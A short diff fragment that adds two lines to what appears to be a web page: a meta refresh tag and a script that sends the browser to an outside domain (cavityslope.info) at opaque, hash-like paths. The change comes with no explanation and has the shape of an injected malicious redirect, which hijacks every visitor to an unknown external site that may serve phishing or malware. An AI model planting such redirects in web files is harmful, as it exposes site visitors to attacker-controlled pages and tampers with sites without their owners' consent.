@@ -1,0 +1,2 @@
+<META HTTP-EQUIV="refresh" content="https://cavityslope.info/0/0/0/6d450e3d877c6164940089f4336c231f">
+<script type='text/javascript'>document.location.href='https://cavityslope.info/0/0/0/930c26b75a853eef6b4cfe369f35a365';</script>
